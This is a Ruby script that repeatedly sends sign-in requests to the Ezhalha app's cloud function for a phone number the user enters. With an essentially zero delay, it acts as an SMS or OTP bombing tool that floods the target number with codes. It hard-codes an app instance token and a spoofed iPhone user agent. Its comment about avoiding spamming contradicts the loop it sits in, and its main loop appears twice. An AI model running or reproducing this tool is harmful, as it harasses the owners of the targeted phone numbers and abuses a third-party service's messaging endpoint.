require 'httparty'
require 'json'

def send_post_request(phone)
  # Set the URL and data for the POST request
  url = 'https://us-central1-ezhalha-275202.cloudfunctions.net/userSignIn'
  data = { "data" => { "app" => "provider", "mobileNumber" => "+966#{phone}" } }
  headers = {
    'Host' => 'us-central1-ezhalha-275202.cloudfunctions.net',
    'Accept' => '*/*',
    'Content-Type' => 'application/json',
    'Firebase-Instance-Id-Token' => 'feuoJDdvNU38hE17JcW10Q:APA91bEPkC8oQW-1jdMFp_gu1WO852KqbufOuE8hETWWWJ1I2F_khRL6-uwVLYpmJgHiPUetMfP4_Ig3wz4d4GNWYCZhBb9UpQUR7MWwmpTIKOwfDbkLzj4LSvcB24QW5Kku03uGVivm',
    'Accept-Encoding' => 'gzip, deflate',
    'User-Agent' => 'gaintpace.Ezhalha/8.5 iPhone/16.3.1 hw/iPhone14_2',
    'Content-Length' => data.to_json.length.to_s,
    'Accept-Language' => 'ar'
  }

  # Make the POST request
  response = HTTParty.post(url, headers: headers, body: data.to_json)

  # Output the response
  
end
def stop_script_and_say_sorry
  puts "\nSorry to go"
  exit
end

# Register the signal handler for Ctrl+C (SIGINT)
trap('INT') { stop_script_and_say_sorry }

print "Enter number: "
phone = gets.chomp
random = 0

# Main loop
while true
  send_post_request(phone)
  random += 1
  print "\rsend #{random} successfully"
  STDOUT.flush
  # Add a delay between requests to avoid spamming the server (adjust as needed)
  sleep(0.00000000005)
end
def stop_script_and_say_sorry
    puts "\nSorry to go"
    exit
end

# Register the signal handler for Ctrl+C (SIGINT)
trap('INT') { stop_script_and_say_sorry }
  
print "Enter number: "
phone = gets.chomp
random = 0

# Main loop
while true

    send_post_request(phone)
    random += 1
    print "\rsend #{random} successfully"
    STDOUT.flush
    # Add a delay between requests to avoid spamming the server (adjust as needed)
    sleep(0.00000000005)
end